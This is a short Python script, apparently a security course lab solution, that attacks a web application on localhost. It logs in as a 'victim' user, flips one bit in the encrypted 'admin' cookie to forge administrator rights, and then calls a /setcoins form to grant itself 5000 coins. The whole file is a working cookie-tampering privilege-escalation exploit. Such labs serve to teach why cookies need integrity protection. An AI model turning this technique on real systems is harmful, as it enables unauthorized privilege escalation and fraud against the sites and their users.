from requests import codes, Session
import binascii

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"


def do_login_form(sess, username, password):
    data_dict = {"username": username, "password": password, "login": "Login"}
    response = sess.post(LOGIN_FORM_URL, data_dict)
    return response.status_code == codes.ok


def do_setcoins_form(sess, uname, coins):
    data_dict = {
        "username": uname,
        "amount": str(coins),
    }
    response = sess.post(SETCOINS_FORM_URL, data_dict)
    return response.status_code == codes.ok


def maul_cookie(original_cookie):
    mauled_cookie = bytearray(bytes.fromhex(original_cookie))
    mauled_cookie[0] =  mauled_cookie[0] ^ 0x01
    return mauled_cookie.hex()


def do_attack():
    sess = Session()
    
    # you'll need to change this to a non-admin user, such as 'victim'.
    uname = "victim"
    pw = "victim"
    assert do_login_form(sess, uname, pw)
    
    # Maul the admin cookie in the 'sess' object here
    admin_cookie = sess.cookies.get("admin")
    session_cookie = sess.cookies.get("session")

    modified_cookie = maul_cookie(admin_cookie)
    
    sess.cookies.clear()
    sess.cookies.set("admin", modified_cookie)
    sess.cookies.set("session", session_cookie)

    target_uname = uname
    amount = 5000
    result = do_setcoins_form(sess, target_uname, amount)
    print("Attack successful? " + str(result))


if __name__ == "__main__":
    do_attack()
